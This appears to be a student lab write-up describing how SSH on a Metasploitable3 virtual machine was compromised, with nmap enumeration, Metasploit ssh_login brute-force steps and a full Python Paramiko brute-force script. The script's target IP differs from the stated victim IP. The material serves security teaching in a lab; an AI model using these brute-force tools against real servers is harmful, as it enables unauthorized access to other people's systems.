# Phase 1 Work
---

# Phase 1: Setup and Compromise the Service

## Overview

In this phase, we configured two virtual environments to simulate an attack scenario. The target machine (Metasploitable3) was configured with several known vulnerable services, and the attacker machine (Kali Linux) was used to compromise one of these services. The selected service for this phase was **SSH**, which was successfully compromised using both Metasploit and a custom script.

---

## 1. Environment Setup

### 🖥 Victim Environment: Metasploitable3
- **Platform:** VirtualBox on Windows
- **IP Adress**: 192.168.56.101
  ![لقطة شاشة 2025-04-29 225928](https://github.com/user-attachments/assets/3f0d03ed-c30f-46d7-a50d-3b23d42c9405)

-**Vulnerable Services Running:**
We executed the command nmap -sV 192.168.56.101 to perform a service version scan on the target machine. This allowed us to enumerate the active services and identify potential vulnerabilities, ultimately helping us select SSH as the target for exploitation.
![لقطة شاشة 2025-04-29 230118](https://github.com/user-attachments/assets/20f0d103-8a20-4df2-9e9c-70f95b7f92df)


### 💻 Attacker Environment: Kali Linuxs
- **Platform:** VirtualBox on Windows
- **IP Adress**: 192.168.56.102
  ![لقطة شاشة 2025-04-29 230105](https://github.com/user-attachments/assets/aba89bfb-3d89-4f8a-a34e-79832e7815d6)


#### Tools Used:
- Metasploit Framework
- Nmap
- Hydra
- Python 3 with Paramiko library
    
---

## 2. Selected Vulnerable Service

- **Targeted Service:** SSH (Port 22)  
- **Reason for Selection:** SSH on Metasploitable3 is configured with weak/default credentials, making it vulnerable to brute-force attacks or password reuse exploits.

---

## Service Enumeration

We scanned the target machine using `nmap` to identify open ports and determine which services were running.

Command used:
```
nmap -sV 192.168.56.101
```

## Task 1.1: Compromise Using Metasploit

Steps to exploit the SSH service:

1. Launch Metasploit:
   ```
   msfconsole
   ```
2. Search for the SSH login module:
   ```
   search ssh_login
   ```
3. Use the auxiliary scanner:
   ```
   use auxiliary/scanner/ssh/ssh_login
   ```
4. Configure the module:
   ```
   set RHOSTS 192.168.56.101
   set USER_FILE user.txt
   set PASS_FILE pass.txt
   run
   ```
5. Successful login confirms service compromise.

## Task 1.2 – Compromise Using Custom Script

## 🔐 Custom SSH Brute-Force Script (Python + Paramiko)

This script automates brute-force login attempts to the SSH service using combinations from `user.txt` and `pass.txt`.

This script automates brute-force login attempts to the SSH service using combinations from `user.txt` and `pass.txt`.

```python
import paramiko
import time

host = "192.168.100.138"
port = 22
user_file = "/home/bdoor/user.txt"
pass_file = "/home/bdoor/pass.txt"

def try_login(username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, port=port, username=username, password=password, timeout=5)
        print(f"[+] SUCCESS: {username}:{password}")
        ssh.close()
        return True
    except paramiko.AuthenticationException:
        print(f"[-] Invalid:  {username}:{password}")
    except paramiko.SSHException as e:
        print(f"[!] SSH Error: {e}")
    except Exception as e:
        print(f"[!] Other Error: {e}")
    return False

with open(user_file, "r") as users:
    for user in users:
        user = user.strip()
        with open(pass_file, "r") as passwords:
            for pwd in passwords:
                pwd = pwd.strip()
                if try_login(user, pwd):
                    exit(0)
                time.sleep(1)  # Wait 1 second to avoid banner issues

print("[*] Brute-force complete. No valid credentials found.")
```
---

## 5. Conclusion

We successfully exploited the SSH service running on Metasploitable3 using:
1. **Metasploit**, leveraging known default credentials.
2. A **custom Python script**, automating the brute-force and login process.



